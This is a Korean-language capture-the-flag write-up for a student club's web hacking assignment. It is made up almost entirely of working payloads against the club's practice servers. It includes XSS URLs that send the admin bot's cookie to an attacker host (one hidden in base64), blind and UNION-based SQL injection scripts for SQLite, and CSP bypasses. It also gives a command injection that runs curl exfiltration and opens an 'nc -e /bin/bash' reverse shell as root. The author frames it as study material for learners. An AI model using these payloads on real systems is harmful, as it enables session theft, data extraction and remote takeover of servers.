# TL;DR

자세한 설명은 생략하고 공격에 성공한 페이로드만 작성했습니다. 분석은 해킹에 필수적인 역량입니다. 아래 페이로드를 하나씩 분석하고 참고하다 보면 공부가 많이 될거라고 생각합니다. ~~(사실 다 핑계고 사진 넣고 설명 넣기 귀찮..)~~

해킹에는 정답이 없습니다. 당연하게도, 이 여름 과제에도 문제마다 다양한 풀이가 있을 수 있습니다. 아래 적힌 풀이가 절대적인 정답은 아니니 참고해주시면 감사하겠습니다. (+ 출제자의 의도와 다르게 풀린 문제도 있습니다.) 



# Beginner

동아리 수업 내용에 굉장히 부합하는 문제들로 구성되어 있었습니다. 난이도도 적당했다고 생각합니다. 개인 서버를 사용해야 한다는 점과 SQLite 환경에서 인젝션을 해야한다는 점이 뉴비들에게 큰 어려움으로 다가왔을 것 같습니다. 하지만 덕분에 더 practical한 문제였다고 생각합니다.



## XSS

관리자 봇의 쿠키 값을 탈취해야 합니다. 리얼월드에서는 쿠키에 http only 옵션이 붙어있기 때문에 중요한 쿠키 값을 탈취하는게 대부분 불가능합니다. 하지만 문제 페이지에 들어가서 쿠키를 확인해보면 http only 옵션이 안 붙어있는 것을 확인할 수 있습니다. 쿠키를 탈취해서 공격자의 서버로 전송하는 자바스크립트를 작성하면 됩니다.



### XSS1

There's no filtering.

```
<img src='a' onerror='location.href="http://<attacker>:9999/?"+document.cookie;'>
http://prob.icewall.org:10002/?q=%3Cimg+src%3D%27a%27+onerror%3D%27location.href%3D%22http%3A%2F%2F<attacker>%3A9999%2F%3F%22%2Bdocument.cookie%3B%27%3E
```



### XSS2

Script tag is filtered.

```
<img src='a' onerror='location.href="http://<attacker>:9999/?"+document.cookie;'>
http://prob.icewall.org:10002/?q=%3Cimg+src%3D%27a%27+onerror%3D%27location.href%3D%22http%3A%2F%2F<attacker>%3A9999%2F%3F%22%2Bdocument.cookie%3B%27%3E
```



### XSS3

Quotation mark is filtered.

```
<img src=a onerror=eval(atob(`bG9jYXRpb24uaHJlZj0iaHR0cDovLzQ5LjE2Ni4yNDIuNjk6OTk5OS8/Iitkb2N1bWVudC5jb29raWU7`))>
```



## SQL Injection

SQL 인젝션을 수행해서 데이터베이스에 있는 플래그 값을 읽어오면 됩니다. (sqlmap이 작동하지 않아서 수동으로 해야합니다.)



### SQL Injection1

Do blind SQL injection.

```python
import requests
import string


def req(brute):
  s = requests.Session()

  url = 'http://prob.icewall.org:10005/login'
  params = {}
  params['id'] = f'guasdf" or (id="admin" and pw like "{brute}%") -- d'
  params['pw'] = 'asdfasdf'

  res = s.get(url,params=params)
  return '로그인 성공' in res.text

def main():

  correct = 'd9vn2!@sgdnwi2ndla2d0'
  for a in string.printable:
    for c in string.printable:
      if c == '%':
        continue

      brute = correct + c
      output = req(brute)
      print(c)
      if output == True:
        correct += c
        print("correct = %s" % correct)
        break

if __name__ == '__main__':
  main()
```



### SQL Injection2

```
http://prob.icewall.org:10006/board_view?id=3%20and%201=0%20union%20select%20(select%20sql%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20limit%203,1),2,3,4%20--%20d

http://prob.icewall.org:10006/board_view?id=3%20and%201=0%20union%20select%20(select%20flagBNd92hdn3kijB%20from%20flagI1nf0j3bHJdo),2,3,4%20--%20d
```



### SQL Injection3

```
http://prob.icewall.org:10007/board?board=notice/**/where/**/0=1/**/union/**/select/**/(select/**/sql/**/FROM/**/sqlite_master/**/WHERE/**/type=%27table%27/**/limit/**/0,1),2,3,4--

http://prob.icewall.org:10007/board?board=notice/**/where/**/0=1/**/union/**/select/**/(select/**/flag83hnNdk893Nd2/**/from/**/flag923nvg0Kd2DD),2,3,4--
```



### SQL Injection4

 Do blind SQL injection.

```python
import requests
import string


def req(brute):
  s = requests.Session()

  url = 'http://prob.icewall.org:10008/submit'
  params = {}
  #params['number'] = f'12312312 union select sql from sqlite_master where type="table" and substr(sql,0,{length})="{brute}" -- d'
  params['number'] = f'12312312 union select sql from sqlite_master where type="table" and sql like "%{brute}%" COLLATE BINARY-- d'
  params['number'] = f'12312312 union select sql from sqlite_master where type="table" and instr(sql,"{brute}")'
  params['number'] = f'12312312 union select flagcolumn from flagtable where instr(flagcolumn,"{brute}")'

  res = s.get(url,params=params)
  #print(res.text)
  return 'true' in res.text

def main():

  correct = 'create table `flagtable`(%flag'
  correct = 'FLAG{B0olean_bAs3d}'
  while True:
    for c in string.printable:
      brute = correct + c
      out = req(brute)
      print("%s : %s" % (brute, str(out)))
      if out == True:
        correct += c
        print("correct = %s" % correct)
        break

if __name__ == '__main__':
  main()
```



# Advanced

수업에서 다뤘던 내용에 부합하는 문제들로 구성되어 있습니다. ~~출제가가 바보라서~~ 의도하지 않은 풀이가 많이 존재했습니다. (+ baby HRS 문제를 풀려고 몇시간 삽질을 했지만 풀리지 않았습니다. 출제자는 문제가 잘못 출제되었음을 깨닫고 ~~저에게 싹싹 빌며~~ 문제를 삭제했습니다. 하지만 덕분에 http request smuggling에 대해 공부할 수 있는 시간이었습니다.)



## CSP

CSP는 브라우저 상에서 일어나는 공격을 방어하기 위해 만든 보호 기법입니다. 이걸 우회하는 XSS payload를 작성하여 관리자 봇의 쿠키 값을 탈취하면 됩니다.

Tip: CSP evaluator를 사용하면 유용합니다. (잘못된 CSP 설정 잡아줌)



### CSP1

```
http://prob.icewall.org:10012/?fname=aa&lname=bb&email=cc%40cc.cc&subject=dd&message=%22%22%3E%3C/textarea%3E%3Cscript%20src=%22data:text/html%20,location.href=%27http://<attacker>:9999/?%27%2Bdocument.cookie%22%3E%3C/script%3E
```



### CSP2

```
http://prob.icewall.org:10013/?name={{constructor.constructor(%27location.href=%22http://<attacker>:9999/?%22%2bdocument.cookie%27)()}}
```



### CSP3

Unintended solution. I could take off the CSP operation by doing something. After that, it's just a general XSS.

```
http://prob.icewall.org:10014/%3Cobject%20src=%22a.html%22%20type='text/html'%3E%3C/object%3E%3Cscript%3Elocation.href=%22http://<attacker>:9999/%22%3C/script%3E
```



## dom based XSS

Maybe unintended solution.

```
http://prob.icewall.org:10004/?url=%23%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cimg%20src=a%20onerror=eval(atob(`bG9jYXRpb24uaHJlZj0iaHR0cDovLzQ5LjE2Ni4yNDIuNjk6OTk5OS8/Iitkb2N1bWVudC5jb29raWU7`))%3E
```

https://jjy-security.tistory.com/73



## baby web cache

There's an unintended command injection vulnerability. And the service is running as root permission. So it's possible to exploit the server.

```
http://prob.icewall.org:10011/report?url=http://<attacker>:9999/

http://prob.icewall.org:10011/report?url=\%27;curl%20-X%20POST%20http://<attacker>:9999/%20-d%20%22`apt-get%20install%20-y%20wget%20netcat%202%3E%261`%22%20%23

http://prob.icewall.org:10011/report?url=\%27;nc%20<attacker>%209999%20-e%20/bin/bash%20%23
```

https://jjy-security.tistory.com/50